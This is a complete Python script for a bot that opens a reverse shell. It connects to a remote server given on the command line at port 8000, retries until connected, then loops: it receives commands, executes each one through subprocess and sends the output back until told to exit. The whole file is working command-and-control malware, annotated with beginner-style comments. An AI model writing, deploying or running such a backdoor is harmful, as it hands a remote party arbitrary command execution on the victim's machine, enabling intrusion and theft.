import sys
from subprocess import Popen, PIPE
from socket import *
import time

serverName = sys.argv[1]
serverPort = 8000

# Creating IPv4 (AF_INET) & TCP-port (SOCK_STREAM)

clientSocket = socket(AF_INET, SOCK_STREAM)

while True:
    try:
        clientSocket.connect((serverName,serverPort)) # connecting
        break
    except ConnectionRefusedError:
        print("Connection refused, retrying in 5 seconds...")
        time.sleep(5)

clientSocket.send('The bot is successfully connected and is waiting for your commands'.encode()) # first message | encode converts the message into binary data for sending
command = clientSocket.recv(4064).decode() # convert the information received from the socket

while command != 'x': # x = exit
    proc = Popen(command.split(' '), stdout=PIPE, stderr=PIPE)  # creating a subprocess and passing a command
    result, err = proc.communicate() # getting results
    clientSocket.send(result)
    command = clientSocket.recv(4064).decode() # convert the information received from the socket

clientSocket.close()
